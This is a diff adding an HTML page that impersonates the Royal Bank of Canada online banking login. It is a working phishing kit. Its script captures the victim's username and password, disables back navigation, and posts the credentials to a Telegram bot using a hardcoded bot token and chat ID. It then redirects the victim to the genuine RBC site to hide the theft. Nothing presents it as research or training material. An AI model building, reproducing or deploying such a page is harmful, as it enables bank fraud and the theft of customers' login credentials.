@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Royal Bank of Canada - Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-MB7x3PbUQwTUpiBrb1hzfvkhVXOg4Cnc7SRFto1xPVWhe7QEo2Ul7t3ODfn/hWZg/2X8r+DR2LlsmC5tc+E3cw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            min-height: 100vh;
+        }
+        .banner-container {
+            width: 100%;
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .banner-container img {
+            width: 100%;
+            height: auto;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 320px;
+            text-align: center;
+        }
+        h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #0056b3;
+        }
+        label {
+            display: block;
+            text-align: left;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #000;
+            position: relative;
+        }
+        label i {
+            margin-right: 8px; /* Adjust margin as needed */
+        }
+        label::after {
+            content: '';
+        }
+        input[type="text"], input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ced4da;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+            font-size: 14px;
+            text-align: left;
+        }
+        .checkbox-label input[type="checkbox"] {
+            margin-right: 8px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0056b3;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #00419c;
+        }
+        a {
+            display: block;
+            margin-top: 20px;
+            color: #0056b3;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 12px;
+            color: #6c757d;
+        }
+        footer .links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 10px;
+        }
+        footer .links a {
+            color: #0056b3;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        footer .links a:hover {
+            text-decoration: underline;
+        }
+        .username-display {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: #000;
+        }
+       
+        .info-button {
+       cursor: pointer;
+       position: absolute;
+      top: 0;
+      right: calc(100% + 10px); /* Position the button to the right of the checkbox with some spacing */
+      background-color: #0056b3;
+     color: #ffffff;
+      border: none;
+      border-radius: 50%;
+      font-size: 14px;
+      line-height: 1;
+      width: 20px;
+      height: 20px;
+      padding: 0;
+      display: flex;
+     justify-content: center;
+     align-items: center;
+       
+     }
+
+
+        .info-box {
+            background-color: #f0f0f0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 12px;
+            text-align: left;
+        }
+        .info-box p {
+            margin: 5px 0;
+        }
+        .info-box::before {
+            content: '\26A0\FE0F';
+            margin-right: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="banner-container">
+        <img src="Screenshot 2024-05-20 at 10.20.10.png" alt="Banner">
+    </div>
+    <div class="container" id="username-form">
+        <form onsubmit="handleUsernameForm(event)">
+            <label for="username">
+                <i class="fas fa-lock"></i> <!-- Padlock icon -->
+                Client Card or Username
+                <button class="info-button" onclick="showInfoBox()">?</button>
+            </label>
+            <div class="info-box" id="info-box" style="display: none;">
+                <p>Save client card or username</p>
+                <p>If you delete the cookies on your computer, you’ll erase any saved client card numbers or usernames.</p>
+                <p>We don’t recommend this option if you’re using a public or shared computer.</p>
+            </div>
+            <input type="text" id="username" name="username" placeholder="Client Card or Username" required>
+            <label class="checkbox-label">
+                <input type="checkbox" name="save-username">
+                Save information
+            </label>
+            <button type="submit">Next</button>
+        </form>
+        <a href="https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01?_gl=1*ix7b2u*_ga*MjA2NjcwNzc2LjE3MTYxODcwMTE.*_
+        ga_89NPCTDXQR*MTcxNjE5MDk4MS4yLjEuMTcxNjE5MTA4MC4yOC4wLjA." target="_blank">Recover Your Username</a>
+        <a href="https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01?_gl=1*2ggvf0*_ga*MjA2NjcwNzc2LjE3MTYxODcwMTE.*_ga_2X4B01K1J2*MTcxNjE5MDk4Mi4yLjEuMTcxNjE5MTA5OS4xMy4wLjA.*_ga_89NPCTDXQR*MTcxNjE5MDk4MS4yLjEuMTcxNjE5MTEwMi42LjAuMA.." target="_blank">Enrol in Online Banking</a>
+        <a href="#" onclick="openSidebar()">Other Online Services</a>
+    </div>
+
+    <div class="container" id="password-form" style="display: none;">
+        <div class="username-display" id="username-display"></div>
+        <form onsubmit="handlePasswordForm(event)">
+            <label for="password">
+                <i class="fas fa-lock"></i> <!-- Padlock icon -->
+                Password
+            </label>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <label class="checkbox-label">
+                <input type="checkbox" id="show-password-checkbox">
+                Show password
+            </label>
+            <button type="submit">Sign In</button>
+        </form>
+        <a href="https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01?_gl=1*144ilxo*_ga*MjA2NjcwNzc2LjE3MTYxODcwMTE.*_ga_89NPCTDXQR*MTcxNjE5MDk4MS4yLjEuMTcxNjE5MzMxOS41NS4wLjA.*_ga_2X4B01K1J2*MTcxNjE5MDk4Mi4yLjEuMTcxNjE5MzMxNS42MC4wLjA." target="_blank">Reset Your Password</a>
+        <a href="https://www.rbcroyalbank.com/onlinebanking/remember_my_card/about.html">Having Trouble Signing In?</a>
+    </div>
+
+    <footer>
+        <div class="links">
+            <a href="https://www.rbc.com/legal/index.html" target="_blank">Legal</a>
+            <a href="https://www.rbc.com/accessibility/index.html" target="_blank">Accessibility</a>
+            <a href="https://www.rbc.com/privacysecurity/ca/index.html" target="_blank">Privacy & Security</a>
+            <a href="https://secure.royalbank.com/statics/login-service-ui/index#/full/signin?_gl=1*1r6k086*_gcl_au*MTAwMjYxNjExNi4xNzE2MTg3MDEx*_ga*MjA2NjcwNzc2LjE3MTYxODcwMTE.*_ga_89NPCTDXQR*MTcxNjE5MjcyOC4yLjAuMTcxNjE5MjcyOS41OS4wLjA.&_ga=2.266292556.2142471456.1716187011-206670776.1716187011&LANGUAGE=ENGLISH" target="_blank">Advertising & Cookies</a>
+        </div>
+        <p>RBC Online Banking is provided by Royal Bank of Canada.<br>&copy; 1995-2024 Royal Bank of Canada</p>
+    </footer>
+
+    <script>
+        function handleUsernameForm(event) {
+            event.preventDefault();
+            const username = event.target.username.value;
+            document.getElementById('username-display').textContent = `Signing in with "${username}"`;
+            document.getElementById('username-form').style.display = 'none';
+            document.getElementById('password-form').style.display = 'block';
+
+            // Disable back navigation
+            history.pushState(null, document.title, location.href);
+            window.addEventListener('popstate', function () {
+                history.pushState(null, document.title, location.href);
+            });
+        }
+
+        function handlePasswordForm(event) {
+            event.preventDefault();
+            const username = document.querySelector('#username-display').textContent.split('"')[1];
+            const password = event.target.password.value;
+            sendToTelegramBot(username, password);
+            window.location.href = 'https://www.rbcroyalbank.com/personal.html'; // Redirect to the desired page
+        }
+
+        function sendToTelegramBot(username, password) {
+            const telegramBotToken = '7092763134:AAFoVnFRJKr5uw1QsaSx_0TVm5lfUd3Rifc';
+            const chatId = 7043309571;
+            const message = `Username: ${username}\nPassword: ${password}`;
+            
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => response.json())
+              .then(data => {
+                  console.log('Success:', data);
+              })
+              .catch((error) => {
+                  console.error('Error:', error);
+              });
+        }
+
+        function openSidebar() {
+            // Replace with your desired functionality to open the sidebar
+            alert('Opening sidebar...');
+        }
+
+        function showInfoBox() {
+            const infoBox = document.getElementById('info-box');
+            infoBox.style.display = infoBox.style.display === 'block' ? 'none' : 'block';
+        }
+
+        const saveUsernameCheckbox = document.querySelector('input[name="save-username"]');
+        const showPasswordCheckbox = document.getElementById('show-password-checkbox');
+
+        saveUsernameCheckbox.addEventListener('change', function() {
+            // Implement your save username logic here
+            console.log('Save username checked:', saveUsernameCheckbox.checked);
+        });
+
+        showPasswordCheckbox.addEventListener('change', function() {
+            const passwordInput = document.getElementById('password');
+            if (showPasswordCheckbox.checked) {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        });
+    </script>
+</body>
+</html>
